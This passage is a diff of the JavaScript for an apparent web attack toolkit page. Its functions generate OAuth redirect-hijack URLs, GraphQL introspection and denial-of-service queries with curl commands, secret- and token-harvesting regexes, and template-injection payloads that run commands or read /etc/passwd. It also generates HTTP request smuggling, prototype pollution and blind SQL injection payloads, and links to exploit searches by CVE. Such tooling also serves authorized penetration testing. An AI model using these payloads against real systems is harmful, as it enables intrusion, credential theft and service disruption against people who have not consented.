+                        // Assumes client app has open redirect at /redirect?url=
+                        attackUrls.push({ name: "Chain with Open Redirect", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri + '/redirect?url=' + attackerUri)}&state=test` });
+                        attackUrls.push({ name: "Conceptual Example", url: `VICTIM_SITE/oauth/login -> OAUTH_PROVIDER -> VICTIM_SITE/callback?code=XYZ -> VICTIM_SITE/redirect?url=ATTACKER_SITE?code=XYZ` });
+                        break;
+                    case 'implicit_flow':
+                        note = 'If Implicit Flow (response_type=token) is enabled, tokens are sent in the URL fragment, increasing leakage risk (Referrer header, browser history).';
+                        attackUrls.push({ name: "Standard Implicit Flow Request", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=token&scope=openid&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        attackUrls.push({ name: "Implicit Flow to Attacker URI (if redirect bypass works)", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=token&scope=openid&redirect_uri=${encodeURIComponent(attackerUri)}&state=test` });
+                        break;
+                }
+            } catch (e) {
+                 output += `<div class="text-red-500">Error parsing Redirect URI: ${escapeHTML(e.message)}</div>`;
+                 document.getElementById('oauth_output').innerHTML = output;
+                 return;
+            }
+            // --- End OAuth Attack URL Generation ---
+
+            if (attackUrls.length > 0) {
+                 if (note) {
+                     output += `<div class="text-sm text-yellow-500 mb-3">${escapeHTML(note)}</div>`;
+                 }
+                attackUrls.forEach(item => {
+                    output += `<div class="mb-3">
+                        <div class="text-sm text-green-400 mb-1">${escapeHTML(item.name)}:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(item.url)}')">${escapeHTML(item.url)}</pre>
+                    </div>`;
+                });
+            } else {
+                output += '<div class="text-gray-500">No specific attack URLs generated for this type yet.</div>';
+            }
+
+            outputDiv.innerHTML = output;
+        }
+
+        function generateGraphQLAttack() {
+            const endpoint = document.getElementById('graphql_endpoint').value.trim();
+            const attackType = document.getElementById('graphql_attack').value;
+            const schemaInput = document.getElementById('graphql_schema').value.trim(); // Optional schema
+            const outputDiv = document.getElementById('graphql_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!endpoint) {
+                 outputDiv.innerHTML = '<div class="text-red-500">Please provide the GraphQL Endpoint URL.</div>';
+                 return;
+            }
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">GraphQL Queries/Mutations (${escapeHTML(attackType)}):</div>`;
+            let queries = [];
+            let note = `Target Endpoint: ${escapeHTML(endpoint)}`;
+            let curlCommand = '';
+
+            // --- GraphQL Query Generation ---
+            switch (attackType) {
+                case 'introspection':
+                    note += '\nAttempts to fetch the schema definition.';
+                    queries.push({
+                        name: "Introspection Query",
+                        query: JSON.stringify({ query: "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }" })
+                    });
+                    break;
+                case 'dos_alias':
+                     note += '\nAttempts DoS by requesting the same field many times using aliases. Adjust alias count based on server limits.';
+                     let aliases = '';
+                     for(let i=0; i<100; i++) { aliases += `a${i}: __typename\n`; } // Example: 100 aliases
+                     queries.push({
+                         name: "Alias Overloading DoS",
+                         query: JSON.stringify({ query: `query AliasDoS { ${aliases} }` })
+                     });
+                     break;
+                case 'dos_depth':
+                     note += '\nAttempts DoS via deeply nested queries. Requires knowing nested object relationships from schema (or guessing).';
+                     // Example: Needs schema knowledge. Replace 'nestedObject' and 'id' field.
+                     let depthQuery = 'id\n';
+                     for(let i=0; i<10; i++) { depthQuery = `nestedObject { ${depthQuery} }`; } // 10 levels deep
+                     queries.push({
+                         name: "Deep Recursion DoS (Example)",
+                         query: JSON.stringify({ query: `query DepthDoS { someQuery { ${depthQuery} } }` }) // Replace someQuery
+                     });
+                     break;
+                case 'batch_query':
+                     note += '\nSends multiple queries in one request. Can be abused for DoS or bypassing rate limits if not handled properly.';
+                     queries.push({
+                         name: "Batch Query Example",
+                         query: JSON.stringify([
+                             { query: "query Q1 { someField }" },
+                             { query: "query Q2 { anotherField }" },
+                             { query: "query Q3 { yetAnotherField }" }
+                         ])
+                     });
+                     break;
+                case 'field_suggestion':
+                     note += '\nLeverages field suggestions (if enabled) to potentially leak field names by providing partial input.';
+                     queries.push({
+                         name: "Field Suggestion Probe",
+                         query: JSON.stringify({ query: `query Suggestion { user { pass } }` }) // Look for suggestions like "Did you mean 'password'?"
+                     });
+                     break;
+                case 'sensitive_query':
+                     note += '\nExample query attempting to access potentially sensitive data. Requires schema knowledge.';
+                     queries.push({
+                         name: "Sensitive Data Query (Example)",
+                         query: JSON.stringify({ query: `query Sensitive { users { id username email passwordHash role } }` }) // Guess common sensitive fields
+                     });
+                     queries.push({
+                         name: "Configuration Query (Example)",
+                         query: JSON.stringify({ query: `query Config { systemConfig { apiKey secretKey } }` })
+                     });
+                     break;
+            }
+            // --- End GraphQL Query Generation ---
+
+            if (queries.length > 0) {
+                 output += `<div class="text-sm text-yellow-500 mb-3">${escapeHTML(note)}</div>`;
+                 queries.forEach(item => {
+                     curlCommand = `curl -X POST -H "Content-Type: application/json" --data \\'${item.query}\\' ${endpoint}`;
+                     output += `<div class="mb-4">
+                        <div class="text-sm text-green-400 mb-1">${escapeHTML(item.name)}:</div>
+                        <div class="text-xs text-gray-500 mb-1">JSON Payload:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(item.query)}')">${escapeHTML(item.query)}</pre>
+                        <div class="text-xs text-gray-500 mt-2 mb-1">Curl Command:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(curlCommand)}')">${escapeHTML(curlCommand)}</pre>
+                    </div>`;
+                 });
+            } else {
+                output += '<div class="text-gray-500">No specific query generated for this attack type yet.</div>';
+            }
+
+            outputDiv.innerHTML = output;
+        }
+
+        function extractPatterns(type) {
+            const input = document.getElementById('extractor_input').value;
+            const customRegexInput = document.getElementById('extractor_regex').value.trim();
+            const outputDiv = document.getElementById('extractor_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!input) {
+                 outputDiv.innerHTML = '<div class="text-red-500">Please paste text into the input area first.</div>';
+                 return;
+            }
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">Extraction Results (${escapeHTML(type)}):</div>`;
+            let patternsToUse = {};
+            let totalMatches = 0;
+
+            // Define regex patterns
+            const patterns = {
+                secrets: {
+                    'AWS Key ID': /AKIA[0-9A-Z]{16}/g,
+                    'AWS Secret Key': /(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/g, // Avoid Base64 chunks
+                    'Google API Key': /AIza[0-9A-Za-z\\-_]{35}/g,
+                    'Google OAuth ID': /[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com/g,
+                    'GitHub Token (Classic)': /ghp_[0-9a-zA-Z]{36}/g,
+                    'GitHub Token (Fine-grained)': /github_pat_[0-9a-zA-Z_]{82}/g,
+                    'GitHub OAuth': /gho_[0-9a-zA-Z]{36}/g,
+                    'GitLab Personal Token': /glpat-[0-9a-zA-Z\-\_]{20}/g,
+                    'Slack Token (Bot)': /xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}/g,
+                    'Slack Token (User)': /xoxp-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}/g,
+                    'Slack Webhook': /https:\/\/hooks\.slack\.com\/services\/[A-Za-z0-9]+\/[A-Za-z0-9]+\/[a-zA-Z0-9]+/g,
+                    'Stripe API Key': /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
+                    'Twilio API Key': /SK[0-9a-fA-F]{32}/g,
+                    'Generic API Key': /[aA][pP][iI]_?[kK][eE][yY]\s*[:=]\s*['"]?[0-9a-zA-Z\-_]{16,128}['"]?/g, // key = value
+                    'Generic Secret': /[sS][eE][cC][rR][eE][tT]\s*[:=]\s*['"]?[0-9a-zA-Z\-_/+]{16,128}['"]?/g, // secret = value
+                    'Password in URL': /https?:\/\/[^:]+:[^@]+@/g, // http://user:password@host
+                },
+                cloud: {
+                    'AWS Account ID': /\b\d{12}\b/g, // Simple 12 digit number
+                    'Azure Storage Account Key': /[a-zA-Z0-9+\/]{88}==/g, // Standard Azure Storage Key length/format
+                    'Azure Connection String': /DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+(?:;EndpointSuffix=[^;]+)?/g,
+                    'GCP Service Account Key (JSON)': /"private_key": "-----BEGIN PRIVATE KEY-----\\n[A-Za-z0-9+\/\\n=]+-----END PRIVATE KEY-----\\n"/g,
+                    'EC2 Instance ID': /i-[0-9a-f]{8,17}/g,
+                    'S3 Bucket URL': /https?:\/\/[a-zA-Z0-9.\-]+s3[.-][a-zA-Z0-9\-]+amazonaws\.com/g,
+                    'CloudFront URL': /https?:\/\/[a-zA-Z0-9]+\.cloudfront\.net/g,
+                },
+                tokens: {
+                    'JWT': /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g,
+                    'Bearer Token': /Bearer\s+[a-zA-Z0-9_\-\.\/+=]+/gi,
+                    'Basic Auth Header': /Authorization:\s+Basic\s+[a-zA-Z0-9+\/=]+/gi,
+                    'OAuth Token (Generic)': /(access|refresh)_token\s*[:=]\s*['"]?[a-zA-Z0-9_\-.\/+=]{20,}['"]?/gi,
+                    'Session ID (Common Patterns)': /(sessionid|sessid|jsessionid|phpsessid)\s*[:=]\s*['"]?[a-zA-Z0-9\-_]{16,}['"]?/gi,
+                },
+                ips: {
+                    'IPv4 Address': /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g,
+                    'IPv6 Address': /(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))/gi, // Comprehensive IPv6 regex
+                    'Domain Name': /\b((?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})\b/g, // More robust domain regex
+                    'URL': /https?:\/\/(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b(?:[-a-zA-Z0-9()@:%_\+.~#?&//=]*)/g,
+                },
+                emails: {
+                    'Email Address': /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
+                }
+            };
+
+            if (type === 'custom') {
+                if (!customRegexInput) {
+                    outputDiv.innerHTML = '<div class="text-red-500">Please enter a custom regex pattern.</div>';
+                    return;
+                }
+                try {
+                    // Attempt to create regex with global flag
+                    const customRegex = new RegExp(customRegexInput, 'g');
+                    patternsToUse['Custom Regex'] = customRegex;
+                } catch (e) {
+                    outputDiv.innerHTML = `<div class="text-red-500">Invalid custom regex: ${escapeHTML(e.message)}</div>`;
+                    return;
+                }
+            } else if (patterns[type]) {
+                patternsToUse = patterns[type];
+            } else {
+                 outputDiv.innerHTML = '<div class="text-red-500">Invalid pattern type selected.</div>';
+                 return;
+            }
+
+            // --- Extraction Loop ---
+            for (const patternName in patternsToUse) {
+                const regex = patternsToUse[patternName];
+                let matches = [];
+                let match;
+                // Use exec loop to handle potential overlapping matches correctly with /g flag
+                while ((match = regex.exec(input)) !== null) {
+                    // Avoid infinite loops with zero-width matches
+                    if (match.index === regex.lastIndex) {
+                        regex.lastIndex++;
+                    }
+                    matches.push(match[0]);
+                }
+
+                // Deduplicate matches for cleaner output
+                const uniqueMatches = [...new Set(matches)];
+
+                if (uniqueMatches.length > 0) {
+                    totalMatches += uniqueMatches.length;
+                    output += `<div class="mb-4">
+                        <div class="text-green-400 font-bold">${escapeHTML(patternName)} (${uniqueMatches.length}):</div>`;
+                    uniqueMatches.forEach((m, index) => {
+                        output += `<div class="mb-1 ml-2">
+                            <pre class="clickable inline-block" onclick="copyToClipboard('${escapeHTML(m)}')">${escapeHTML(m)}</pre>
+                        </div>`;
+                    });
+                    output += `</div>`;
+                }
+            }
+            // --- End Extraction Loop ---
+
+            if (totalMatches === 0) {
+                output += '<div class="text-gray-500">No matches found for the selected patterns.</div>';
+            }
+
+            outputDiv.innerHTML = output;
+        }
+
+        // --- NEW: SSTI Function ---
+        function generateSSTI() {
+            const engine = document.getElementById('ssti_engine').value;
+            const command = document.getElementById('ssti_command').value.trim() || 'id';
+            const outputDiv = document.getElementById('ssti_output');
+            let payloads = [];
+            let notes = "Inject these into parameters likely processed by a template engine. Start with detection payloads.";
+
+            const detectionPayloads = [
+                { name: "Basic Detection (Math)", payload: "${7*7}" }, { name: "Basic Detection (Alt)", payload: "{{7*7}}" },
+                { name: "Basic Detection (Alt 2)", payload: "<%= 7*7 %>" }, { name: "Basic Detection (Alt 3)", payload: "#{7*7}" },
+                { name: "Generic Code Context", payload: "${{self}}" }, { name: "Generic Code Context (Alt)", payload: "{{self}}" },
+            ];
+
+            payloads.push(...detectionPayloads);
+
+            switch (engine) {
+                case 'jinja2':
+                    payloads.push({ name: "Jinja2 RCE (config)", payload: "{{ config.items() }}" });
+                    payloads.push({ name: "Jinja2 RCE (os.popen)", payload: `{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}` });
+                    payloads.push({ name: "Jinja2 RCE (subprocess)", payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${command}').read() }}` });
+                    payloads.push({ name: "Jinja2 RCE (Alt)", payload: `{{ cycler.__init__.__globals__.os.popen('${command}').read() }}` });
+                    break;
+                case 'twig':
+                    payloads.push({ name: "Twig RCE (exec)", payload: `{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"${command}\")}}` });
+                    payloads.push({ name: "Twig RCE (passthru)", payload: `{{_self.env.registerUndefinedFilterCallback(\"passthru\")}}{{_self.env.getFilter(\"${command}\")}}` });
+                    break;
+                case 'freemarker':
+                    payloads.push({ name: "FreeMarker RCE", payload: "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${r\"${ex(\'\"}${command}${r\"\')}\"}" });
+                    payloads.push({ name: "FreeMarker File Read", payload: "<#assign fc = \"freemarker.template.utility.ObjectConstructor\"?new()>${r\"${fc('java.io.FileReader','/etc/passwd').read()}\"}" });
+                    break;
+                case 'velocity':
+                     payloads.push({ name: "Velocity RCE", payload: `#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec("${command}")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end` });
+                     break;
+                 case 'erb':
+                     payloads.push({ name: "ERB RCE", payload: `<%= \`${command}\` %>` });
+                     payloads.push({ name: "ERB RCE (system)", payload: `<%= system("${command}") %>` });
+                     payloads.push({ name: "ERB File Read", payload: `<%= File.read('/etc/passwd') %>` });
+                     break;
+                 // Add more engines...
+                default: // Generic - already added detection payloads
+                    notes += " Specific engine payloads provide more direct RCE attempts.";
+                    break;
+            }
+            renderOutput('ssti_output', `SSTI Payloads (${engine})`, payloads, notes);
+        }
+
+        // --- NEW: HTTP Request Smuggling Function ---
+        function generateSmuggling() {
+            const type = document.getElementById('smuggling_type').value;
+            const host = document.getElementById('smuggling_host').value.trim() || 'example.com';
+            const prefix = document.getElementById('smuggling_prefix').value.trim() || `POST / HTTP/1.1\r\nHost: ${host}`;
+            const smuggled = document.getElementById('smuggling_smuggled').value.trim() || `GET /admin HTTP/1.1\r\nHost: ${host}\r\nFoo: bar`;
+            const outputDiv = document.getElementById('smuggling_output');
+            let payloads = [];
+            let notes = `Target Host: ${host}. Requires vulnerable proxy setup. Test carefully.`;
+
+            const smuggledLenHex = smuggled.length.toString(16);
+            const smuggledLenDec = smuggled.length.toString();
+
+            switch (type) {
+                case 'cl_te':
+                    notes += " Frontend uses Content-Length, Backend uses Transfer-Encoding.";
+                    payloads.push({
+                        name: "CL.TE Basic",
+                        payload: `${prefix}\r\nContent-Length: ${smuggledLenDec + 6}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n${smuggled}`
+                    });
+                     payloads.push({
+                        name: "CL.TE Obfuscated TE",
+                        payload: `${prefix}\r\nContent-Length: ${smuggledLenDec + 6}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n${smuggled}`
+                    });
+                    break;
+                case 'te_cl':
+                    notes += " Frontend uses Transfer-Encoding, Backend uses Content-Length.";
+                    payloads.push({
+                        name: "TE.CL Basic",
+                        payload: `${prefix}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n${smuggledLenHex}\r\n${smuggled}\r\n0\r\n\r\n`
+                    });
+                     payloads.push({
+                        name: "TE.CL Obfuscated TE",
+                        payload: `${prefix}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\nContent-Length: 4\r\n\r\n${smuggledLenHex}\r\n${smuggled}\r\n0\r\n\r\n`
+                    });
+                    break;
+                case 'te_te':
+                     notes += " Both use Transfer-Encoding, but one can be obfuscated.";
+                     payloads.push({
+                        name: "TE.TE Obfuscated",
+                        payload: `${prefix}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n${smuggledLenHex}\r\n${smuggled}\r\n0\r\n\r\n`
+                    });
+                    break;
+            }
+            renderOutput('smuggling_output', `HTTP Request Smuggling (${type})`, payloads, notes);
+        }
+
+        // --- NEW: Prototype Pollution Function ---
+        function generatePollution() {
+            const technique = document.getElementById('pp_technique').value;
+            const property = document.getElementById('pp_property').value.trim() || 'isAdmin';
+            const value = document.getElementById('pp_value').value.trim() || 'true'; // Keep as string for flexibility
+            const outputDiv = document.getElementById('pp_output');
+            let payloads = [];
+            let notes = "Client-side examples. Effectiveness depends on how/where objects are merged or accessed.";
+
+            // Try to parse value, default to string if fails
+            let parsedValue;
+            try { parsedValue = JSON.parse(value); } catch { parsedValue = value; } // Keep as string if not valid JSON primitive
+
+            switch (technique) {
+                case 'basic_object':
+                    payloads.push({ name: "Direct __proto__", payload: `let obj = {}; obj.__proto__.${property} = ${JSON.stringify(parsedValue)}; console.log(({}).${property});` });
+                    payloads.push({ name: "Object.create", payload: `let obj = Object.create(null); /* Cannot pollute via obj.__proto__ */` });
+                    break;
+                case 'constructor':
+                     payloads.push({ name: "Via constructor.prototype", payload: `let obj = {}; obj.constructor.prototype.${property} = ${JSON.stringify(parsedValue)}; console.log(({}).${property});` });
+                     break;
+                case 'url_param':
+                    notes += " Assumes server-side code merges URL params into an object unsafely.";
+                    payloads.push({ name: "URL Param (__proto__)", payload: `/?__proto__[${property}]=${encodeURIComponent(value)}` });
+                    payloads.push({ name: "URL Param (constructor)", payload: `/?constructor[prototype][${property}]=${encodeURIComponent(value)}` });
+                    break;
+                case 'json_parse':
+                     notes += " Assumes JSON is parsed and merged unsafely.";
+                     payloads.push({ name: "JSON with __proto__", payload: `JSON.parse('{"__proto__": {"${property}": ${JSON.stringify(parsedValue)}}}')` });
+                     payloads.push({ name: "JSON with constructor", payload: `JSON.parse('{"constructor": {"prototype": {"${property}": ${JSON.stringify(parsedValue)}}}}')` });
+                     break;
+            }
+             renderOutput('pp_output', `Prototype Pollution (${technique})`, payloads, notes);
+        }
+
+        // --- NEW: Blind SQLi Helper ---
+        function generateBlindSQLi() {
+            const type = document.getElementById('bsqli_type').value;
+            const db = document.getElementById('bsqli_db').value;
+            const query = document.getElementById('bsqli_query').value.trim() || 'SELECT @@version';
+            const sleepTime = document.getElementById('bsqli_sleep').value || 5;
+            const outputDiv = document.getElementById('bsqli_output');
+            let payloads = [];
+            let notes = `Blind SQLi structures for ${db}. Replace '...' with injection point logic (e.g., ' AND ... -- ).`;
+
+            // Character-by-character extraction structure (example for version length)
+            const commonLengthQuery = `LENGTH((${query}))`;
+            const commonCharQuery = (indexVar) => `ASCII(SUBSTRING((${query}),${indexVar},1))`; // Generic, adjust SUBSTRING/ASCII per DB
+
+            switch (type) {
+                case 'boolean':
+                    notes += " Check for different responses (page content, status code).";
+                    let boolPayload = `... AND ${commonLengthQuery} > 10 -- `; // Example length check
+                    payloads.push({ name: "Length Check (Boolean)", payload: boolPayload });
+                    let charCheckPayload = `... AND ${commonCharQuery(1)} > 50 -- `; // Example first char check
+                    payloads.push({ name: "Character Check (Boolean)", payload: charCheckPayload });
+                    // DB Specific boolean syntax
+                    if (db === 'mssql') {
+                         payloads.push({ name: "MSSQL Char Check", payload: `... IF (ASCII(SUBSTRING((${query}),1,1))) > 50 WAITFOR DELAY '0:0:0' -- ` }); // Using IF for boolean
+                    }
+                    break;
+                case 'time':
+                    notes += ` Check for response delay (~${sleepTime} seconds).`;
+                    let timePayload = '';
+                    switch (db) {
+                        case 'mysql': timePayload = `... AND IF(${commonCharQuery(1)}>50, SLEEP(${sleepTime}), 0) -- `; break;
+                        case 'postgres': timePayload = `... AND CASE WHEN (${commonCharQuery(1)}>50) THEN pg_sleep(${sleepTime}) ELSE pg_sleep(0) END -- `; break;
+                        case 'mssql': timePayload = `... IF (${commonCharQuery(1)}>50) WAITFOR DELAY '0:0:${sleepTime}' -- `; break;
+                        case 'oracle': timePayload = `... AND CASE WHEN (${commonCharQuery(1)}>50) THEN dbms_pipe.receive_message('xyz',${sleepTime}) ELSE NULL END -- `; break; // Might need execute grant
+                        case 'sqlite': timePayload = `... AND ${commonCharQuery(1)} > 50 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sleepTime}00000000/2)))) -- `; break; // Complex workaround
+                    }
+                    payloads.push({ name: `Time-Based Check (${db})`, payload: timePayload });
+                    break;
+            }
+             renderOutput('bsqli_output', `Blind SQLi (${type} / ${db})`, payloads, notes);
+        }
+
+        // --- NEW: CVE Lookup Function ---
+        function lookupCVE() {
+            const cveIdInput = document.getElementById('cve_id').value.trim();
+            const outputDiv = document.getElementById('cve_output');
+            outputDiv.innerHTML = ''; // Clear previous results
+
+            const cvePattern = /^CVE-\d{4}-\d{4,}$/i;
+            if (!cvePattern.test(cveIdInput)) {
+                outputDiv.innerHTML = '<div class="text-danger">Invalid CVE ID format (e.g., CVE-YYYY-NNNN).</div>';
+                return;
+            }
+            const cveId = cveIdInput.toUpperCase(); // Standardize format
+
+            outputDiv.innerHTML = `<div class="text-accent font-semibold mb-3">PoC Search Links for ${escapeHTML(cveId)}:</div>`;
+
+            const resources = [
+                { name: "Exploit-DB", url: `https://www.exploit-db.com/search?cve=${cveId.split('-')[1]}-${cveId.split('-')[2]}` }, // EDB uses YYYY-NNNN format in search
+                { name: "GitHub", url: `https://github.com/search?q=${cveId}&type=repositories` },
+                { name: "Packet Storm", url: `https://packetstormsecurity.com/search/?q=${cveId}` },
+                { name: "Google (Exploit/PoC)", url: `https://www.google.com/search?q=${cveId}+exploit+OR+poc` },
+                { name: "NVD (Details)", url: `https://nvd.nist.gov/vuln/detail/${cveId}` },
+                // { name: "CIRCL (API - Experimental)", url: `https://cve.circl.lu/api/cve/${cveId}` } // Requires separate fetch logic if desired
+            ];
+
+            resources.forEach(res => {
+                outputDiv.innerHTML += `
+                    <div class="mb-1">
+                        <a href="${escapeHTML(res.url)}" target="_blank" rel="noopener noreferrer" class="text-accent hover:underline text-sm">
+                            ${escapeHTML(res.name)} Search
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
+                            </svg>
+                        </a>
+                    </div>`;
+            });
+
+            // Optional: Add CIRCL API Fetch Logic (Example)
+            outputDiv.innerHTML += `<div id="circl-output" class="mt-3 text-xs border-t border-default pt-2">Querying CIRCL API...</div>`;
+            fetch(`https://cve.circl.lu/api/cve/${cveId}`)
+                .then(response => {
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.json();
+                })
+                .then(data => {
+                    const circlDiv = document.getElementById('circl-output');
+                    if (circlDiv) {
+                        let circlInfo = `<span class="font-semibold text-success">CIRCL Info:</span><br>`;
+                        circlInfo += `Summary: ${escapeHTML(data?.summary || 'N/A')}<br>`;
+                        circlInfo += `CVSSv3: ${escapeHTML(data?.cvss3 || data?.cvss || 'N/A')}<br>`;
+                        circlInfo += `References: ${data?.references?.length || 0}`;
+                        circlDiv.innerHTML = circlInfo;
+                    }
+                })
+                .catch(error => {
+                    console.error("CIRCL API Error:", error);
+                    const circlDiv = document.getElementById('circl-output');
+                    if(circlDiv) circlDiv.innerHTML = `<span class="text-danger">Could not fetch CIRCL data: ${error.message}</span>`;
+                });
+        }
+
+
+        // --- Import/Export Functions ---    
+        function copyAll() {
+            let allContent = "";
+            for (const section in exportableContent) {
+                if (exportableContent.hasOwnProperty(section) && exportableContent[section].length > 0) {
+                    allContent += `--- ${section.replace(/_/g, ' ').toUpperCase()} ---\n`;
+                    allContent += exportableContent[section].join('\n') + '\n\n';
+                }
+            }
+
+            if (allContent) {
+                copyToClipboard(allContent.trim());
+            } else {
+                showToast("No content generated yet to export!");
+            }
+        }
+
+        function importTools(event) {
+            const file = event.target.files[0];
+            if (!file) {
+                showToast("No file selected.");
+                return;
+            }
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                try {
+                    const importedData = JSON.parse(e.target.result);
+                    // Basic validation/processing example:
+                    if (typeof importedData === 'object' && importedData !== null) {
+                        // Could merge into exportableContent or populate fields, etc.
+                        // Example: Load first XSS payload if present
+                        if (importedData.xss && Array.isArray(importedData.xss) && importedData.xss.length > 0) {
+                            // Maybe add to a custom list? For now, just show a message.
+                            console.log("Imported XSS data:", importedData.xss);
+                        }
+                        // Add more specific import logic here based on expected JSON structure
+                        exportableContent = { ...exportableContent, ...importedData }; // Simple merge
+                        showToast(`Imported data from ${file.name}. Content merged.`);
+                        // Optionally, trigger regeneration or update UI based on imported data
+                    } else {
+                         showToast("Invalid import format. Expected JSON object.");
+                    }
+                } catch (err) {
+                    console.error("Import Error:", err);
+                    showToast(`Error importing file: ${err.message}`);
+                } finally {
+                     // Reset file input to allow importing the same file again
+                     event.target.value = null;
+                }
+            };
+            reader.onerror = () => {
+                 showToast(`Error reading file: ${reader.error}`);
+                 event.target.value = null;
+            };
+            reader.readAsText(file);
+        }
+
+
+        // --- Theme Function ---
+        function toggleTheme() {
+            document.body.classList.toggle('light-theme');
+            const isLight = document.body.classList.contains('light-theme');
+            document.getElementById('theme-toggle-button').textContent = isLight ? '☀️' : '🌙';
+            // Re-draw matrix with potentially new color
+            // stopMatrix(); // Stop existing interval
+            // startMatrix(); // Start new one (drawMatrix checks theme)
+            // showToast("Theme toggled!");
+        }
+
+        // --- Resize Handler ---
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            columns = canvas.width / 10;
+            drops.length = Math.floor(columns);
+            drops.fill(1);
+            // Ensure matrix restarts if stopped due to resize/error
+            // stopMatrix(); // Optional: stop before starting
+            // startMatrix();
+        });
+        // --- Initialization & Resize ---
+        window.addEventListener('load', () => { document.getElementById('theme-toggle-button').textContent = '🌙'; startMatrix(); });
+        // window.addEventListener('resize', () => { stopMatrix(); setupMatrix(); startMatrix(); });
+
+        // --- Final Setup ---
+        // Add event listeners or initial calls if needed
+        // Example: Generate default XSS on load?
+        // generateXSS();
+
+    </script>
+</body>
+</html>
